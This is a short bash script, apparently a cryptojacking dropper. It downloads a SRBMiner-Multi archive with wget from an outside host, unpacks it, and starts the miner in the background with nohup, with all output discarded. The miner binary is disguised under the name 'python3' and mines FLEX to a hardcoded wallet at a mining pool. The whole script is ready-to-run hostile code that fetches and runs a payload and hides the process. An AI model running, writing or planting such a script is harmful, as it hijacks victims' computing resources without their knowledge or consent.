#!/bin/bash

kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)

wget -O dot momok.x10.bz/DOT-SRB.tar.gz

tar xvf dot

cd SRBMiner-Multi-2-5-6

nohup ./dotsrb/python3 -a FLEX -P kc1qmk8nx9ur8uqvtx5rlhx4wjana5pelq9lgka35f.DOT-$kolot@eu.mpool.live:5271 > /dev/null 2>&1 &
